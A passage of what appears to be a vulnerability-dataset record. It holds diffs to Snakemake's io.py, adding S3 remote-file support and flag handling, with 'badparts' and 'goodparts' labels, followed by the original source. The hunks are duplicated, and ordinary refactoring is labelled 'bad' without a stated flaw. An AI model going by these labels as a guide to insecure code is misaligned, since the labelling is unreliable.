exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n","add":45,"remove":3,"filename":"\/snakemake\/io.py","badparts":["    def protected(self):","        return self.exists and not os.access(self.file, os.W_OK)","        if not self.exists and lstat(self.file):"],"goodparts":["    @_referToRemote","    def exists_local(self):","        return os.path.exists(self.file)","    @property","    def exists_remote(self):","        return (self.is_remote and self.remote_object.exists())","    def protected(self):","        return self.exists_local and not os.access(self.file, os.W_OK)","    @property","    @_referToRemote","        return lstat(self.file).st_mtime","    @property","    def flags(self):","        return getattr(self._file, \"flags\", {})","    @property","    def mtime_local(self):","    @_referToRemote","    @property","    def size_local(self):","        self.check_broken_symlink()","        return os.path.getsize(self.file)","        if not self.exists_local and lstat(self.file):","    def download_from_remote(self):","        logger.info(\"Downloading from remote: {}\".format(self.file))","        if self.is_remote and self.remote_object.exists():","            self.remote_object.download()","        else:","            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")","    def upload_to_remote(self):","        logger.info(\"Uploading to remote: {}\".format(self.file))","        if self.is_remote and not self.remote_object.exists():","            self.remote_object.upload()","        else:","            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")"]},{"diff":"\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["    def touch(self):","            lutime(self.file, None)"],"goodparts":["    def touch(self, times=None):","        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"","            lutime(self.file, times)"]},{"diff":"\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n","add":12,"remove":2,"filename":"\/snakemake\/io.py","badparts":["        return IOFile(apply_wildcards(f, wildcards,","                      rule=self.rule)"],"goodparts":["        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})","        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,","                                      rule=self.rule)","        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))","        return fileWithWildcardsApplied"]},{"diff":"\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n","add":9,"remove":1,"filename":"\/snakemake\/io.py","badparts":["        return flag in value.flags"],"goodparts":["        return flag in value.flags and value.flags[flag]","    if isinstance(value, _IOFile):","        return flag in value.flags and value.flags[flag]","def get_flag_value(value, flag_type):","    if isinstance(value, AnnotatedString):","        if flag_type in value.flags:","            return value.flags[flag_type]","        else:","            return None"]},{"diff":"\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n","add":1,"remove":1,"filename":"\/snakemake\/io.py","badparts":["    annotated = flag(value, \"dynamic\")"],"goodparts":["    annotated = flag(value, \"dynamic\", True)"]},{"diff":"\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError"],"goodparts":["import functools","from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException","import snakemake.remote_providers.S3 as S3"]},{"diff":"\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n","add":45,"remove":3,"filename":"\/snakemake\/io.py","badparts":["    def protected(self):","        return self.exists and not os.access(self.file, os.W_OK)","        if not self.exists and lstat(self.file):"],"goodparts":["    @_referToRemote","    def exists_local(self):","        return os.path.exists(self.file)","    @property","    def exists_remote(self):","        return (self.is_remote and self.remote_object.exists())","    def protected(self):","        return self.exists_local and not os.access(self.file, os.W_OK)","    @property","    @_referToRemote","        return lstat(self.file).st_mtime","    @property","    def flags(self):","        return getattr(self._file, \"flags\", {})","    @property","    def mtime_local(self):","    @_referToRemote","    @property","    def size_local(self):","        self.check_broken_symlink()","        return os.path.getsize(self.file)","        if not self.exists_local and lstat(self.file):","    def download_from_remote(self):","        logger.info(\"Downloading from remote: {}\".format(self.file))","        if self.is_remote and self.remote_object.exists():","            self.remote_object.download()","        else:","            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")","    def upload_to_remote(self):","        logger.info(\"Uploading to remote: {}\".format(self.file))","        if self.is_remote and not self.remote_object.exists():","            self.remote_object.upload()","        else:","            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")"]},{"diff":"\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["    def touch(self):","            lutime(self.file, None)"],"goodparts":["    def touch(self, times=None):","        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"","            lutime(self.file, times)"]},{"diff":"\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n","add":12,"remove":2,"filename":"\/snakemake\/io.py","badparts":["        return IOFile(apply_wildcards(f, wildcards,","                      rule=self.rule)"],"goodparts":["        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})","        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,","                                      rule=self.rule)","        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))","        return fileWithWildcardsApplied"]},{"diff":"\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n","add":9,"remove":1,"filename":"\/snakemake\/io.py","badparts":["        return flag in value.flags"],"goodparts":["        return flag in value.flags and value.flags[flag]","    if isinstance(value, _IOFile):","        return flag in value.flags and value.flags[flag]","def get_flag_value(value, flag_type):","    if isinstance(value, AnnotatedString):","        if flag_type in value.flags:","            return value.flags[flag_type]","        else:","            return None"]},{"diff":"\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n","add":1,"remove":1,"filename":"\/snakemake\/io.py","badparts":["    annotated = flag(value, \"dynamic\")"],"goodparts":["    annotated = flag(value, \"dynamic\", True)"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import stat import time import json from itertools import product, chain from collections import Iterable, namedtuple from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError from snakemake.logging import logger def lstat(f): return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks) def lutime(f, times): return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks) def lchmod(f, mode): return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks) def IOFile(file, rule=None): f=_IOFile(file) f.rule=rule return f class _IOFile(str): \"\"\" A file that is either input or output of a rule. \"\"\" dynamic_fill=\"__snakemake_dynamic__\" def __new__(cls, file): obj=str.__new__(cls, file) obj._is_function=type(file).__name__==\"function\" obj._file=file obj.rule=None obj._regex=None return obj @property def file(self): if not self._is_function: return self._file else: raise ValueError(\"This IOFile is specified as a function and \" \"may not be used directly.\") @property def exists(self): return os.path.exists(self.file) @property def protected(self): return self.exists and not os.access(self.file, os.W_OK) @property def mtime(self): return lstat(self.file).st_mtime @property def size(self): self.check_broken_symlink() return os.path.getsize(self.file) def check_broken_symlink(self): \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\" if not self.exists and lstat(self.file): raise WorkflowError(\"File{} seems to be a broken symlink.\".format(self.file)) def is_newer(self, time): return self.mtime > time def prepare(self): path_until_wildcard=re.split(self.dynamic_fill, self.file)[0] dir=os.path.dirname(path_until_wildcard) if len(dir) > 0 and not os.path.exists(dir): try: os.makedirs(dir) except OSError as e: if e.errno !=17: raise e def protect(self): mode=(lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~ stat.S_IWOTH) if os.path.isdir(self.file): for root, dirs, files in os.walk(self.file): for d in dirs: lchmod(os.path.join(self.file, d), mode) for f in files: lchmod(os.path.join(self.file, f), mode) else: lchmod(self.file, mode) def remove(self): remove(self.file) def touch(self): try: lutime(self.file, None) except OSError as e: if e.errno==2: raise MissingOutputException( \"Output file{} of rule{} shall be touched but \" \"does not exist.\".format(self.file, self.rule.name), lineno=self.rule.lineno, snakefile=self.rule.snakefile) else: raise e def touch_or_create(self): try: self.touch() except MissingOutputException: with open(self.file, \"w\") as f: pass def apply_wildcards(self, wildcards, fill_missing=False, fail_dynamic=False): f=self._file if self._is_function: f=self._file(Namedlist(fromdict=wildcards)) return IOFile(apply_wildcards(f, wildcards, fill_missing=fill_missing, fail_dynamic=fail_dynamic, dynamic_fill=self.dynamic_fill), rule=self.rule) def get_wildcard_names(self): return get_wildcard_names(self.file) def contains_wildcard(self): return contains_wildcard(self.file) def regex(self): if self._regex is None: self._regex=re.compile(regex(self.file)) return self._regex def constant_prefix(self): first_wildcard=_wildcard_regex.search(self.file) if first_wildcard: return self.file[:first_wildcard.start()] return self.file def match(self, target): return self.regex().match(target) or None def format_dynamic(self): return self.replace(self.dynamic_fill, \"{*}\") def __eq__(self, other): f=other._file if isinstance(other, _IOFile) else other return self._file==f def __hash__(self): return self._file.__hash__() _wildcard_regex=re.compile( \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\") def wait_for_files(files, latency_wait=3): \"\"\"Wait for given files to be present in filesystem.\"\"\" files=list(files) get_missing=lambda:[f for f in files if not os.path.exists(f)] missing=get_missing() if missing: logger.info(\"Waiting at most{} seconds for missing files.\".format( latency_wait)) for _ in range(latency_wait): if not get_missing(): return time.sleep(1) raise IOError(\"Missing files after{} seconds:\\n{}\".format( latency_wait, \"\\n\".join(get_missing()))) def get_wildcard_names(pattern): return set(match.group('name') for match in _wildcard_regex.finditer(pattern)) def contains_wildcard(path): return _wildcard_regex.search(path) is not None def remove(file): if os.path.exists(file): if os.path.isdir(file): try: os.removedirs(file) except OSError: pass else: os.remove(file) def regex(filepattern): f=[] last=0 wildcards=set() for match in _wildcard_regex.finditer(filepattern): f.append(re.escape(filepattern[last:match.start()])) wildcard=match.group(\"name\") if wildcard in wildcards: if match.group(\"constraint\"): raise ValueError( \"If multiple wildcards of the same name \" \"appear in a string, eventual constraints have to be defined \" \"at the first occurence and will be inherited by the others.\") f.append(\"(?P={})\".format(wildcard)) else: wildcards.add(wildcard) f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if match.group(\"constraint\") else \".+\")) last=match.end() f.append(re.escape(filepattern[last:])) f.append(\"$\") return \"\".join(f) def apply_wildcards(pattern, wildcards, fill_missing=False, fail_dynamic=False, dynamic_fill=None, keep_dynamic=False): def format_match(match): name=match.group(\"name\") try: value=wildcards[name] if fail_dynamic and value==dynamic_fill: raise WildcardError(name) return str(value) except KeyError as ex: if keep_dynamic: return \"{{{}}}\".format(name) elif fill_missing: return dynamic_fill else: raise WildcardError(str(ex)) return re.sub(_wildcard_regex, format_match, pattern) def not_iterable(value): return isinstance(value, str) or not isinstance(value, Iterable) class AnnotatedString(str): def __init__(self, value): self.flags=dict() def flag(value, flag_type, flag_value=True): if isinstance(value, AnnotatedString): value.flags[flag_type]=flag_value return value if not_iterable(value): value=AnnotatedString(value) value.flags[flag_type]=flag_value return value return[flag(v, flag_type, flag_value=flag_value) for v in value] def is_flagged(value, flag): if isinstance(value, AnnotatedString): return flag in value.flags return False def temp(value): \"\"\" A flag for an input or output file that shall be removed after usage. \"\"\" if is_flagged(value, \"protected\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"temp\") def temporary(value): \"\"\" An alias for temp. \"\"\" return temp(value) def protected(value): \"\"\" A flag for a file that shall be write protected after creation. \"\"\" if is_flagged(value, \"temp\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"protected\") def dynamic(value): \"\"\" A flag for a file that shall be dynamic, i.e. the multiplicity (and wildcard values) will be expanded after a certain rule has been run \"\"\" annotated=flag(value, \"dynamic\") tocheck=[annotated] if not_iterable(annotated) else annotated for file in tocheck: matches=list(_wildcard_regex.finditer(file)) for match in matches: if match.group(\"constraint\"): raise SyntaxError( \"The wildcards in dynamic files cannot be constrained.\") return annotated def touch(value): return flag(value, \"touch\") def expand(*args, **wildcards): \"\"\" Expand wildcards in given filepatterns. Arguments *args --first arg: filepatterns as list or one single filepattern, second arg(optional): a function to combine wildcard values (itertools.product per default) **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" filepatterns=args[0] if len(args)==1: combinator=product elif len(args)==2: combinator=args[1] if isinstance(filepatterns, str): filepatterns=[filepatterns] def flatten(wildcards): for wildcard, values in wildcards.items(): if isinstance(values, str) or not isinstance(values, Iterable): values=[values] yield[(wildcard, value) for value in values] try: return[filepattern.format(**comb) for comb in map(dict, combinator(*flatten(wildcards))) for filepattern in filepatterns] except KeyError as e: raise WildcardError(\"No values given for wildcard{}.\".format(e)) def limit(pattern, **wildcards): \"\"\" Limit wildcards to the given values. Arguments: **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" return pattern.format(**{ wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values)) for wildcard, values in wildcards.items() }) def glob_wildcards(pattern): \"\"\" Glob the values of the wildcards by matching the given pattern to the filesystem. Returns a named tuple with a list of values for each wildcard. \"\"\" pattern=os.path.normpath(pattern) first_wildcard=re.search(\"{[^{]\", pattern) dirname=os.path.dirname(pattern[:first_wildcard.start( )]) if first_wildcard else os.path.dirname(pattern) if not dirname: dirname=\".\" names=[match.group('name') for match in _wildcard_regex.finditer(pattern)] Wildcards=namedtuple(\"Wildcards\", names) wildcards=Wildcards(*[list() for name in names]) pattern=re.compile(regex(pattern)) for dirpath, dirnames, filenames in os.walk(dirname): for f in chain(filenames, dirnames): if dirpath !=\".\": f=os.path.join(dirpath, f) match=re.match(pattern, f) if match: for name, value in match.groupdict().items(): getattr(wildcards, name).append(value) return wildcards class Namedlist(list): \"\"\" A list that additionally provides functions to name items. Further, it is hashable, however the hash does not consider the item names. \"\"\" def __init__(self, toclone=None, fromdict=None, plainstr=False): \"\"\" Create the object. Arguments toclone --another Namedlist that shall be cloned fromdict --a dict that shall be converted to a Namedlist(keys become names) \"\"\" list.__init__(self) self._names=dict() if toclone: self.extend(map(str, toclone) if plainstr else toclone) if isinstance(toclone, Namedlist): self.take_names(toclone.get_names()) if fromdict: for key, item in fromdict.items(): self.append(item) self.add_name(key) def add_name(self, name): \"\"\" Add a name to the last item. Arguments name --a name \"\"\" self.set_name(name, len(self) -1) def set_name(self, name, index, end=None): \"\"\" Set the name of an item. Arguments name --a name index --the item index \"\"\" self._names[name]=(index, end) if end is None: setattr(self, name, self[index]) else: setattr(self, name, Namedlist(toclone=self[index:end])) def get_names(self): \"\"\" Get the defined names as(name, index) pairs. \"\"\" for name, index in self._names.items(): yield name, index def take_names(self, names): \"\"\" Take over the given names. Arguments names --the given names as(name, index) pairs \"\"\" for name,(i, j) in names: self.set_name(name, i, end=j) def items(self): for name in self._names: yield name, getattr(self, name) def allitems(self): next=0 for name, index in sorted(self._names.items(), key=lambda item: item[1][0]): start, end=index if end is None: end=start +1 if start > next: for item in self[next:start]: yield None, item yield name, getattr(self, name) next=end for item in self[next:]: yield None, item def insert_items(self, index, items): self[index:index +1]=items add=len(items) -1 for name,(i, j) in self._names.items(): if i > index: self._names[name]=(i +add, j +add) elif i==index: self.set_name(name, i, end=i +len(items)) def keys(self): return self._names def plainstrings(self): return self.__class__.__call__(toclone=self, plainstr=True) def __getitem__(self, key): try: return super().__getitem__(key) except TypeError: pass return getattr(self, key) def __hash__(self): return hash(tuple(self)) def __str__(self): return \" \".join(map(str, self)) class InputFiles(Namedlist): pass class OutputFiles(Namedlist): pass class Wildcards(Namedlist): pass class Params(Namedlist): pass class Resources(Namedlist): pass class Log(Namedlist): pass def _load_configfile(configpath): \"Tries to load a configfile first as JSON, then as YAML, into a dict.\" try: with open(configpath) as f: try: return json.load(f) except ValueError: f.seek(0) try: import yaml except ImportError: raise WorkflowError(\"Config file is not valid JSON and PyYAML \" \"has not been installed. Please install \" \"PyYAML to use YAML config files.\") try: return yaml.load(f) except yaml.YAMLError: raise WorkflowError(\"Config file is not valid JSON or YAML.\") except FileNotFoundError: raise WorkflowError(\"Config file{} not found.\".format(configpath)) def load_configfile(configpath): \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\" config=_load_configfile(configpath) if not isinstance(config, dict): raise WorkflowError(\"Config file must be given as JSON or YAML \" \"with keys at top level.\") return config class PeriodicityDetector: def __init__(self, min_repeat=50, max_repeat=100): \"\"\" Args: max_len(int): The maximum length of the periodic substring. \"\"\" self.regex=re.compile( \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format( min_repeat=min_repeat -1, max_repeat=max_repeat -1)) def is_periodic(self, value): \"\"\"Returns the periodic substring or None if not periodic.\"\"\" m=self.regex.search(value) if m is not None: return m.group(\"value\") ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport stat\nimport time\nimport json\nfrom itertools import product, chain\nfrom collections import Iterable, namedtuple\nfrom snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\nfrom snakemake.logging import logger\n\n\ndef lstat(f):\n    return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n\n\ndef lutime(f, times):\n    return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks)\n\n\ndef lchmod(f, mode):\n    return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks)\n\n\ndef IOFile(file, rule=None):\n    f = _IOFile(file)\n    f.rule = rule\n    return f\n\n\nclass _IOFile(str):\n    \"\"\"\n    A file that is either input or output of a rule.\n    \"\"\"\n\n    dynamic_fill = \"__snakemake_dynamic__\"\n\n    def __new__(cls, file):\n        obj = str.__new__(cls, file)\n        obj._is_function = type(file).__name__ == \"function\"\n        obj._file = file\n        obj.rule = None\n        obj._regex = None\n        return obj\n\n    @property\n    def file(self):\n        if not self._is_function:\n            return self._file\n        else:\n            raise ValueError(\"This IOFile is specified as a function and \"\n                             \"may not be used directly.\")\n\n    @property\n    def exists(self):\n        return os.path.exists(self.file)\n\n    @property\n    def protected(self):\n        return self.exists and not os.access(self.file, os.W_OK)\n\n    @property\n    def mtime(self):\n        # do not follow symlinks for modification time\n        return lstat(self.file).st_mtime\n\n    @property\n    def size(self):\n        # follow symlinks but throw error if invalid\n        self.check_broken_symlink()\n        return os.path.getsize(self.file)\n\n    def check_broken_symlink(self):\n        \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n        if not self.exists and lstat(self.file):\n            raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n\n    def is_newer(self, time):\n        return self.mtime > time\n\n    def prepare(self):\n        path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n        dir = os.path.dirname(path_until_wildcard)\n        if len(dir) > 0 and not os.path.exists(dir):\n            try:\n                os.makedirs(dir)\n            except OSError as e:\n                # ignore Errno 17 \"File exists\" (reason: multiprocessing)\n                if e.errno != 17:\n                    raise e\n\n    def protect(self):\n        mode = (lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~\n                stat.S_IWOTH)\n        if os.path.isdir(self.file):\n            for root, dirs, files in os.walk(self.file):\n                for d in dirs:\n                    lchmod(os.path.join(self.file, d), mode)\n                for f in files:\n                    lchmod(os.path.join(self.file, f), mode)\n        else:\n            lchmod(self.file, mode)\n\n    def remove(self):\n        remove(self.file)\n\n    def touch(self):\n        try:\n            lutime(self.file, None)\n        except OSError as e:\n            if e.errno == 2:\n                raise MissingOutputException(\n                    \"Output file {} of rule {} shall be touched but \"\n                    \"does not exist.\".format(self.file, self.rule.name),\n                    lineno=self.rule.lineno,\n                    snakefile=self.rule.snakefile)\n            else:\n                raise e\n\n    def touch_or_create(self):\n        try:\n            self.touch()\n        except MissingOutputException:\n            # create empty file\n            with open(self.file, \"w\") as f:\n                pass\n\n    def apply_wildcards(self, wildcards,\n                        fill_missing=False,\n                        fail_dynamic=False):\n        f = self._file\n        if self._is_function:\n            f = self._file(Namedlist(fromdict=wildcards))\n\n        return IOFile(apply_wildcards(f, wildcards,\n                                      fill_missing=fill_missing,\n                                      fail_dynamic=fail_dynamic,\n                                      dynamic_fill=self.dynamic_fill),\n                      rule=self.rule)\n\n    def get_wildcard_names(self):\n        return get_wildcard_names(self.file)\n\n    def contains_wildcard(self):\n        return contains_wildcard(self.file)\n\n    def regex(self):\n        if self._regex is None:\n            # compile a regular expression\n            self._regex = re.compile(regex(self.file))\n        return self._regex\n\n    def constant_prefix(self):\n        first_wildcard = _wildcard_regex.search(self.file)\n        if first_wildcard:\n            return self.file[:first_wildcard.start()]\n        return self.file\n\n    def match(self, target):\n        return self.regex().match(target) or None\n\n    def format_dynamic(self):\n        return self.replace(self.dynamic_fill, \"{*}\")\n\n    def __eq__(self, other):\n        f = other._file if isinstance(other, _IOFile) else other\n        return self._file == f\n\n    def __hash__(self):\n        return self._file.__hash__()\n\n\n_wildcard_regex = re.compile(\n    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\")\n\n#    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>[^\\}]*))?\\s*\\}\")\n\n\ndef wait_for_files(files, latency_wait=3):\n    \"\"\"Wait for given files to be present in filesystem.\"\"\"\n    files = list(files)\n    get_missing = lambda: [f for f in files if not os.path.exists(f)]\n    missing = get_missing()\n    if missing:\n        logger.info(\"Waiting at most {} seconds for missing files.\".format(\n            latency_wait))\n        for _ in range(latency_wait):\n            if not get_missing():\n                return\n            time.sleep(1)\n        raise IOError(\"Missing files after {} seconds:\\n{}\".format(\n            latency_wait, \"\\n\".join(get_missing())))\n\n\ndef get_wildcard_names(pattern):\n    return set(match.group('name')\n               for match in _wildcard_regex.finditer(pattern))\n\n\ndef contains_wildcard(path):\n    return _wildcard_regex.search(path) is not None\n\n\ndef remove(file):\n    if os.path.exists(file):\n        if os.path.isdir(file):\n            try:\n                os.removedirs(file)\n            except OSError:\n                # ignore non empty directories\n                pass\n        else:\n            os.remove(file)\n\n\ndef regex(filepattern):\n    f = []\n    last = 0\n    wildcards = set()\n    for match in _wildcard_regex.finditer(filepattern):\n        f.append(re.escape(filepattern[last:match.start()]))\n        wildcard = match.group(\"name\")\n        if wildcard in wildcards:\n            if match.group(\"constraint\"):\n                raise ValueError(\n                    \"If multiple wildcards of the same name \"\n                    \"appear in a string, eventual constraints have to be defined \"\n                    \"at the first occurence and will be inherited by the others.\")\n            f.append(\"(?P={})\".format(wildcard))\n        else:\n            wildcards.add(wildcard)\n            f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if\n                                         match.group(\"constraint\") else \".+\"))\n        last = match.end()\n    f.append(re.escape(filepattern[last:]))\n    f.append(\"$\")  # ensure that the match spans the whole file\n    return 